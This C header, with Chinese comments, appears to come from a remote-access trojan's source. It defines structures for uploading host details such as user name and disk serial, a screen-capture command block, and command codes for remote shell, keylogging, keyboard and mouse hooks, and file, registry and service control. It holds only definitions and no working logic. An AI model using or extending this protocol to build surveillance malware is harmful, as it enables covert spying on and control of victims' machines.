typedef struct tagSytemInit         //上传主机信息
{
	char computer[32];
	char user[32];
	char os[72];
	char processor[16];
	char mem[16];
	char version[16];
	char HDSerial[32];
}SYSTEMINIT;

typedef struct tagLinkInfo {       //客户端保持的连接信息
    SOCKET  s;
    string  strBindIp;
    u_short BindPort;
	
}LINKINFO,*LPLINKINFO;

typedef struct tagProcessInfo      //进程信息
{
	DWORD PID;
	char  ProcName[64]; //
	char  ProcPath[128]; //

}PROCESSINFO,*LPPROCESSINFO;

#define CMD_NULL            100   
#define CMD_PROCESS_MANAGE  101
#define CMD_SERVICE_MANAGE  102   
#define CMD_FILE_MANAGE     103
#define CMD_REG_MANAGE      104   
#define CMD_SHELL_MANAGE    105  
#define CMD_SCREEN_MANAGE   106
#define CMD_VIDEO_MANAGE    107
#define CMD_KEYLOG_MANAGE   108

#define CMD_PROCESS_KILL    109
#define CMD_SERVICE_DEL     110

#define CMD_FILE_GETSUBFILE 111
#define CMD_KEY_HOOK        112
#define CMD_MOUSE_HOOK      113
#define CMD_MOUSE_DBHOOK    114
#define CMD_KEY_CAD         115

#define CMD_MOUSE_RDBCLICK     116
#define CMD_MOUSE_LDBCLICK     117
#define CMD_GET_SCREEN_INFO    118
#define CMD_FILE_DEL           119
#define CMD_CMDSHELL           120
#define MY_END                 121
#define CMD_KEYLOG_STOP        122

#define CMD_RETRY              123

typedef struct tagCommand
{
	/////命令ID值//////
	int wCmd;
	/////后接数据大小//
	DWORD DataSize;
	char  tmp[32];
	char  szCurDir[260];
	BOOL  nRet;
	/////屏幕监控需要的参数//////
	CRect  rcArea;     //图象区域
	int  nBits;        //彩色位数  //256 
	int  nArea;      //固定是全屏   //区域设置  0)全屏   1)当前窗口 2)指定区域
	int  nCompress;  //固定是JPEG   //压缩方式  0)不压缩 1)Huffman  2)JPEG
	int  nJpegQ   ;  //固定是80     //Jpeg 的Q值
	DWORD  dwBmpSize;     //图象大小
	DWORD  dwFileSize;    //文件大小
	DWORD  dwBmpInfoSize; //图象信息
	DWORD  dwHookFlags;   //键盘、鼠标信息
	DWORD  dwHookParam1;
	DWORD  dwHookParam2;
	int     nCell;     //动态清零标志
	int    nDelay;    //每块延时
}COMMAND,*LPCOMMAND;


/*
typedef struct tagDriver
{
   char szDriverName[500];
   char szDriverLabel[500];
//   UINT nDriverType;
}DRIVER,*LPDRIVER;
*/

typedef struct tagDriver
{
	char driver[8];
	int  drivertype;
	BOOL end;
}DRIVER;//硬盘结构体


typedef struct tagFileInfo
{
	BOOL invalidir;                       //无效目录
	char filename[128];                   //文件名
	int  filesize;                        //文件大小
	int  begin;                           //开始位置,多线程用
	int  stop;                            //结束位置,多线程用
	char time[32];                        //时间
	BOOL isdirectory;                     //是目录?
	BOOL next;						      //还有下一个?
}FILEINFO;//文件信息结构体

/*
struct MODIFY_DATA 
{
		unsigned int finder;
		TCHAR ws_svcname[32];
		TCHAR ws_svcdisplay[64];
		char ws_svcdesc[256];
		char url[256];
		int  port;
};*/

//extern MODIFY_DATA modify_data; //外部的变量